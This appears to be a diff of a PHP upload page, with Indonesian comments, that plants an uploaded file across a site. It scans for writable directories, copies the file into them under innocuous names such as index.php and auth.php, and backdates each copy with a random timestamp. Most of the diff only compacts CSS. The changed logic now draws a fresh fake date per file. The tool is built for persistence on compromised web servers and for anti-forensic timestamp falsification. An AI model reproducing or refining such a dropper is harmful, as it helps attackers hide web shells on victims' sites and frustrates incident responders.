@@ -48,97 +48,20 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
             --error: #f85149;
             --border: #30363d;
         }
-        * {
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Roboto Mono', monospace;
-        }
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: var(--background);
-            color: var(--text);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-        .card {
-            background-color: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 40px;
-            width: 100%;
-            max-width: 520px;
-            box-shadow: 0 0 30px rgba(0,0,0,0.4);
-            animation: fadeIn 0.4s ease-out;
-        }
-        h1 {
-            text-align: center;
-            color: var(--primary);
-            font-weight: 600;
-            margin-bottom: 25px;
-        }
-        label {
-            display: block;
-            margin-bottom: 10px;
-            font-size: 15px;
-            color: #8b949e;
-        }
-        input[type="file"] {
-            width: 100%;
-            background-color: #0d1117;
-            color: var(--text);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        button {
-            width: 100%;
-            background: var(--primary);
-            color: #0d1117;
-            font-weight: bold;
-            border: none;
-            border-radius: 8px;
-            padding: 12px;
-            cursor: pointer;
-            font-size: 15px;
-            transition: all 0.2s ease;
-        }
-        button:hover {
-            background-color: #00aaff;
-        }
-        .message {
-            margin-top: 25px;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        .success {
-            background-color: rgba(31, 111, 235, 0.1);
-            color: var(--primary);
-            border: 1px solid var(--primary);
-        }
-        .error {
-            background-color: rgba(248, 81, 73, 0.1);
-            color: var(--error);
-            border: 1px solid var(--error);
-        }
-        code {
-            font-family: 'Roboto Mono', monospace;
-            font-size: 13px;
-            color: #58a6ff;
-        }
-        ul {
-            margin: 10px 0 0 20px;
-            padding: 0;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        * { box-sizing: border-box; font-family: 'Segoe UI', 'Roboto Mono', monospace; }
+        body { margin: 0; padding: 0; background-color: var(--background); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background-color: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 40px; width: 100%; max-width: 520px; box-shadow: 0 0 30px rgba(0,0,0,0.4); animation: fadeIn 0.4s ease-out; }
+        h1 { text-align: center; color: var(--primary); font-weight: 600; margin-bottom: 25px; }
+        label { display: block; margin-bottom: 10px; font-size: 15px; color: #8b949e; }
+        input[type="file"] { width: 100%; background-color: #0d1117; color: var(--text); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 14px; }
+        button { width: 100%; background: var(--primary); color: #0d1117; font-weight: bold; border: none; border-radius: 8px; padding: 12px; cursor: pointer; font-size: 15px; transition: all 0.2s ease; }
+        button:hover { background-color: #00aaff; }
+        .message { margin-top: 25px; padding: 15px; border-radius: 8px; font-size: 14px; line-height: 1.5; }
+        .success { background-color: rgba(31, 111, 235, 0.1); color: var(--primary); border: 1px solid var(--primary); }
+        .error { background-color: rgba(248, 81, 73, 0.1); color: var(--error); border: 1px solid var(--error); }
+        code { font-family: 'Roboto Mono', monospace; font-size: 13px; color: #58a6ff; }
+        ul { margin: 10px 0 0 20px; padding: 0; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
@@ -154,12 +77,8 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
 if (isset($_FILES['file'])) {
     $tmp_name = $_FILES['file']['tmp_name'];
 
-    // Buat tanggal random
-    $randomDateTime = date('Y-m-d H:i', strtotime('-' . rand(0, 365) . ' days'));
-    $timestamp      = strtotime($randomDateTime);
-
-    $targetNames    = ['index.php', 'action.php', 'auth.php', 'settings.php'];
-    $allWritable    = scanWritableDirs(__DIR__, 5);
+    $targetNames = ['index.php', 'action.php', 'auth.php', 'settings.php'];
+    $allWritable = scanWritableDirs(__DIR__, 5);
 
     if (empty($allWritable)) {
         echo "<div class='message error'>Tidak ditemukan folder writable.</div>";
@@ -173,6 +92,10 @@ if (isset($_FILES['file'])) {
         $originalContent = @file_get_contents($tmp_name);
 
         foreach ($targetFolders as $folder) {
+            // Buat tanggal random per file
+            $randomDateTime = date('Y-m-d H:i', strtotime('-' . rand(0, 365) . ' days'));
+            $timestamp      = strtotime($randomDateTime);
+
             $randomName = $targetNames[array_rand($targetNames)];
             $target     = $folder . DIRECTORY_SEPARATOR . $randomName;
 
